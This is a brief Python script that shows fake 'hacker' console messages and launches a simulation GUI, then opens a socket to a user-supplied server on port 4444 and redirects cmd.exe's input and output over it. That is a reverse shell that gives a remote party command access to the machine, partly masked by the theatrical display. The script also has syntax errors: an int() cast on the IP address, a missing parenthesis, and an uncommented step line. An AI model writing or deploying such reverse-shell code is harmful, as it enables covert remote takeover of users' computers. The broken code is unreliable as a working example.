import socket
import subprocess
import os
import time

def on_connect():
    # A list of fake "hacker" commands to display
    commands = [
        "echo [+] Initializing secure connection...",
        "echo [+] Bypassing local firewall...",
        "echo [+] Accessing system directories...",
        "dir", 
        "echo [+] Payload executed."
    ]
    for cmd in commands:
        # We print these to the console so the user sees the 'action'
        subprocess.run(cmd, shell=True)
        time.sleep(1) # Adds the "slow typing" effect

# --- Your existing connection logic ---
SERVER_IP = int(input("server ip:")
PORT = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_IP, PORT))

1. RUN THE AUTOMATION FIRST
on_connect()

#2. THEN TRIGGER THE GUI SIMULATION
# This assumes hacker_sim.py is in the same folder
subprocess.Popen(["python", "hacker_sim.py"])

# 3. THEN HAND OVER THE SHELL
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["cmd.exe"])
